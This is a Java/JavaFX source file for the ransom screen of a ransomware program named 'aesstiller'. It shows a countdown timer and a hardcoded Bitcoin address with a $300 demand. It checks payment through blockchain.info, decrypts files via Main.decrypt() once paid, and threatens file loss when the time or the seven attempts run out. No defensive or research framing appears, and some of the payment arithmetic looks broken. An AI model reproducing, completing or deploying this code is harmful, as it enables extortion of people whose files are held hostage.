package org.example.aesstiller;

import com.google.gson.JsonParser;
import javafx.animation.KeyFrame;
import javafx.animation.PauseTransition;
import javafx.animation.Timeline;
import javafx.application.Platform;
import javafx.fxml.FXML;
import javafx.fxml.Initializable;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.TextField;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.scene.layout.AnchorPane;
import javafx.scene.layout.Background;
import javafx.scene.paint.Color;
import javafx.util.Duration;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.time.LocalDateTime;
import java.time.ZoneId;
import java.time.ZonedDateTime;
import java.util.ResourceBundle;
import java.util.Scanner;
import java.util.concurrent.TimeUnit;


public class RansomwareController implements Initializable {
    @FXML
    public TextField addressForCheck;

    @FXML
    private ImageView lockImageView;

    @FXML
    private Label messageLabel;

    @FXML
    private Label bitcoinAddressLabel;

    @FXML
    private Label timerLabel;

    @FXML
    private Button checkPaymentButton;

    @FXML
    private AnchorPane anchorPane;

    private Timeline timeline;
    private int attempts = 7;
    private final String myBitcoinAddress = "1KBX3bPvrLmn9zuncNxPVg1kp28Z9zaG5C";
    double requiredAmount = 300;

    @Override
    public void initialize(URL location, ResourceBundle resources) {
        startTimer();
        lockImageView.setImage(new Image(String.valueOf(Main.class.getResource("lock.jpg"))));
        bitcoinAddressLabel.setText(String.format("""
                Send $300 to Bitcoin address worth of Bitcoin to recover your files.
                Bitcoin address:
                 %s""", myBitcoinAddress));

        checkPaymentButton.setOnAction(_ -> {
            try {
                checkPayment();
            } catch (InterruptedException | IOException e) {
                System.out.println(e.getMessage());
            }
        });

        lockImageView.setFocusTraversable(false);
        messageLabel.setFocusTraversable(false);
        timerLabel.setFocusTraversable(false);
        checkPaymentButton.setFocusTraversable(false);
    }

    private void startTimer() {
        LocalDateTime endTime = LocalDateTime.now().plusHours(3);
        ZonedDateTime zdtEndTime = endTime.atZone(ZoneId.systemDefault());

        timeline = new Timeline(new KeyFrame(Duration.seconds(1), _ -> {
            ZonedDateTime now = ZonedDateTime.now(ZoneId.systemDefault());
            long remainingSeconds = java.time.Duration.between(now, zdtEndTime).getSeconds();

            timerLabel.setText(String.format("%02d:%02d:%02d",
                    TimeUnit.SECONDS.toHours(remainingSeconds),
                    TimeUnit.SECONDS.toMinutes(remainingSeconds) % 60,
                    remainingSeconds % 60));


            if (remainingSeconds <= 0) {
                timeline.stop();
                bitcoinAddressLabel.setText("Time's up!\n YOU LOST YOUR FILES! \n GOODBYE!");
                checkPaymentButton.setDisable(true);
                anchorPane.setBackground(Background.fill(Color.DARKRED));
                stopWithDelay();
            }
        }));

        timeline.setCycleCount(Timeline.INDEFINITE);
        timeline.play();
    }

    private void checkPayment() throws InterruptedException, IOException {
        checkPaymentButton.setDisable(true);
        if (attempts > 0) {
            attempts--;
            String addr = addressForCheck.getText();

            if (addr.isEmpty() || addr.equalsIgnoreCase("Enter your bitcoin address")) {
                bitcoinAddressLabel.setText(String.format("""
                        \t\t\tEnter address if you won't lose your files\s
                        \t\tBitcoin address: %s
                        Don't try to close this window if you won't lose your files""", myBitcoinAddress));
                checkPaymentButton.setDisable(false);
            } else {
                timeline.stop();
                boolean check = checkBitcoinTransaction(addr);
                if (check) {
                    bitcoinAddressLabel.setText("Thank`s\n YOU YOUR FILES DECRYPTED! \n GOODBYE!");
                    checkPaymentButton.setDisable(true);
                    checkPaymentButton.setStyle("-fx-background-color: #a0a0ed;");
                    anchorPane.setBackground(Background.fill(Color.GOLD));
                    checkPaymentButton.setText("Completed");

                    Main.decrypt();
                    stopWithDelay();
                } else {
                    timeline.play();
                    checkPaymentButton.setDisable(false);
                }
            }
        } else {
            bitcoinAddressLabel.setText("You use all attempts!\n YOU LOST YOUR FILES! \n GOODBYE!");
            stopWithDelay();
        }

    }

    private boolean checkBitcoinTransaction(String bitcoinAddress) throws IOException {
        URL url = new URL(String.format("https://blockchain.info/rawaddr/%s", bitcoinAddress));
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");

        Scanner scanner = new Scanner(connection.getInputStream());
        StringBuilder response = new StringBuilder();
        while (scanner.hasNext()) {
            response.append(scanner.nextLine());
        }
        scanner.close();

        double totalReceivedBTC = findAndGetAmountTransaction(response.toString());
        if (totalReceivedBTC == -1) {
            bitcoinAddressLabel.setText(String.format("\t\tTransaction isn't complete, you have yet %d\n\t\tBitcoin address: %s", attempts, myBitcoinAddress));
            return false;
        }
        double totalReceivedUSD = totalReceivedBTC * getBitcoinPrice(); // Convert satoshis to usd

        if (totalReceivedUSD < requiredAmount) {
            bitcoinAddressLabel.setText(String.format("""
                    Don't enough transaction amount you send only %.2f usd\s
                    You have yet %d
                    Bitcoin address: %s""", totalReceivedUSD, attempts, myBitcoinAddress));
            return false;
        }
        return true;
    }

    private double findAndGetAmountTransaction(String response) {
        var txsArray = JsonParser.parseString(response).getAsJsonObject().getAsJsonArray("txs");

        double amount = -1;
        for (int i = 0; i < txsArray.size(); i++) {
            String receiverBitcoinAddress = txsArray.get(i)
                    .getAsJsonObject()
                    .getAsJsonArray("out")
                    .get(0)
                    .getAsJsonObject()
                    .get("addr")
                    .getAsString();
            if (receiverBitcoinAddress.equals(myBitcoinAddress)) {
                amount += txsArray.get(i)
                        .getAsJsonObject()
                        .getAsJsonArray("out")
                        .get(0)
                        .getAsJsonObject()
                        .get("value")
                        .getAsInt();
            }
        }
        return amount;
    }

    private double getBitcoinPrice() throws IOException {
        URL exchangeRateUrl = new URL("https://api.coindesk.com/v1/bpi/currentprice/BTC.json");
        HttpURLConnection exchangeRateConnection = (HttpURLConnection) exchangeRateUrl.openConnection();
        exchangeRateConnection.setRequestMethod("GET");

        Scanner exchangeRateScanner = new Scanner(exchangeRateConnection.getInputStream());
        StringBuilder exchangeRateResponse = new StringBuilder();
        while (exchangeRateScanner.hasNext()) {
            exchangeRateResponse.append(exchangeRateScanner.nextLine());
        }
        exchangeRateScanner.close();

        String exchangeRateJsonResponse = exchangeRateResponse.toString();
        return JsonParser.parseString(exchangeRateJsonResponse).getAsJsonObject()
                       .getAsJsonObject("bpi")
                       .getAsJsonObject("USD")
                       .get("rate_float")
                       .getAsDouble() / 100000000;
    }

    private void stopWithDelay() {
        PauseTransition pause = new PauseTransition(Duration.seconds(10));
        pause.setOnFinished(_ -> Platform.exit());
        pause.play();
    }
}

